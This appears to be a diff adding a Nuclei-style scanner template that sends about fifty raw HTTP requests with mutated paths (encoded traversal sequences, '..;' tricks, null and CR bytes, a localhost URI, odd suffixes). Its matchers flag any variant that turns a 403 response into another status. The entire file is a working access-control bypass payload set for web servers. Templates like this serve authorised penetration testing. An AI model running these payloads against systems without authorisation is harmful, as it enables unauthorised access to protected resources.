@@ -1,0 +1,466 @@
+id: random-4xx-bypass-tricks
+
+info:
+  name: random-4xx-bypass-tricks
+  author: aufzayed
+  severity: info
+  description: random 4xx bypass tricks
+  tags: fuzz
+
+requests:
+  - raw:
+    - |+
+      GET {{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Connection: Close
+
+    - |+
+      GET {{BaseURL}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET {{Scheme}}://localhost{{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET {{Path}}/ HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    
+    - |+
+      GET /%2e{{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET /..3B{{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET /200-OK/%2e%2e{{Path}}/200-OK/%2e%2e/ HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET /200-OK/%2e%2e{{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET /%2f{{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET /%2e%2f{{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET /%25%2f{{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET /%5c{{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET /%C0%AF{{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET /..;{{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET /%2e%80%ae{{reverse(Path)}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET /.{{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET /{{Path}}// HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET //{{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET /.{{Path}}/./ HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}/. HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET /{{Path}}// HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}..;/ HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}/./ HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}& HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}# HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}% HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}%20 HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}%09 HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}../ HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}/../ HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}/..;/ HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}..%2f HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}\..\.\ HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}.././ HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}/* HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET {{Path}}..%00/ HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET {{Path}}..%0d/ HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET {{Path}}..%5c HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET {{Path}}..\ HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET {{Path}}; HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET {{Path}}..%ff HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET {{Path}}%2e%2e%2f HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET {{Path}}.%2e HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET {{Path}}%3f HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET {{Path}}%26 HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}%23 HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+    
+    - |+
+      GET {{Path}}? HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}?? HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      GET {{Path}}.json HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    - |+
+      POST {{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Content-Type: 0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+      Connection: Close
+
+    unsafe: true
+    req-condition: true
+    threads: 10
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 403 && status_code_2 != 403"
+          - "status_code_1 == 403 && status_code_3 != 403"
+          - "status_code_1 == 403 && status_code_4 != 403"
+          - "status_code_1 == 403 && status_code_5 != 403"
+          - "status_code_1 == 403 && status_code_6 != 403"
+          - "status_code_1 == 403 && status_code_7 != 403"
+          - "status_code_1 == 403 && status_code_8 != 403"
+          - "status_code_1 == 403 && status_code_9 != 403"
+          - "status_code_1 == 403 && status_code_10 != 403"
+          - "status_code_1 == 403 && status_code_11 != 403"
+          - "status_code_1 == 403 && status_code_12 != 403"
+          - "status_code_1 == 403 && status_code_13 != 403"
+          - "status_code_1 == 403 && status_code_14 != 403"
+          - "status_code_1 == 403 && status_code_15 != 403"
+          - "status_code_1 == 403 && status_code_16 != 403"
+          - "status_code_1 == 403 && status_code_17 != 403"
+          - "status_code_1 == 403 && status_code_18 != 403"
+          - "status_code_1 == 403 && status_code_19 != 403"
+          - "status_code_1 == 403 && status_code_20 != 403"
+          - "status_code_1 == 403 && status_code_21 != 403"
+          - "status_code_1 == 403 && status_code_22 != 403"
+          - "status_code_1 == 403 && status_code_23 != 403"
+          - "status_code_1 == 403 && status_code_24 != 403"
+          - "status_code_1 == 403 && status_code_25 != 403"
+          - "status_code_1 == 403 && status_code_26 != 403"
+          - "status_code_1 == 403 && status_code_27 != 403"
+          - "status_code_1 == 403 && status_code_28 != 403"
+          - "status_code_1 == 403 && status_code_29 != 403"
+          - "status_code_1 == 403 && status_code_30 != 403"
+          - "status_code_1 == 403 && status_code_31 != 403"
+          - "status_code_1 == 403 && status_code_32 != 403"
+          - "status_code_1 == 403 && status_code_33 != 403"
+          - "status_code_1 == 403 && status_code_34 != 403"
+          - "status_code_1 == 403 && status_code_35 != 403"
+          - "status_code_1 == 403 && status_code_36 != 403"
+          - "status_code_1 == 403 && status_code_37 != 403"
+          - "status_code_1 == 403 && status_code_38 != 403"
+          - "status_code_1 == 403 && status_code_39 != 403"
+          - "status_code_1 == 403 && status_code_40 != 403"
+          - "status_code_1 == 403 && status_code_41 != 403"
+          - "status_code_1 == 403 && status_code_42 != 403"
+          - "status_code_1 == 403 && status_code_43 != 403"
+          - "status_code_1 == 403 && status_code_44 != 403"
+          - "status_code_1 == 403 && status_code_45 != 403"
+          - "status_code_1 == 403 && status_code_46 != 403"
+          - "status_code_1 == 403 && status_code_47 != 403"
+          - "status_code_1 == 403 && status_code_48 != 403"
+          - "status_code_1 == 403 && status_code_49 != 403"
+          - "status_code_1 == 403 && status_code_50 != 403"
